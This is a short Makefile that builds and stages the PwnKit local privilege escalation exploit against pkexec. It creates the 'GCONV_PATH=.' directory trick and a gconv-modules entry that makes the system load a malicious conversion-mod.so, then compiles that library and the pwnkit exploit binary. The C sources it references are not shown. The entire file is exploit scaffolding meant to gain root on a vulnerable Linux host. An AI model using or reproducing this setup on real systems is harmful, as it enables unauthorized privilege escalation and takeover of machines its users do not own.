all:					clean setup conversion-mod.so pwnkit

setup:
	mkdir 'GCONV_PATH=.'
	touch GCONV_PATH=.\/pwn
	chmod +x GCONV_PATH=.\/pwn
	mkdir pwn
	echo 'module	UTF-8//	BRUH//	conversion-mod	1' > pwn/gconv-modules

conversion-mod.so:
	gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c

pwnkit:
	gcc -o pwnkit pwnkit.c

clean:
	rm -rf 'GCONV_PATH=.' pwn pwnkit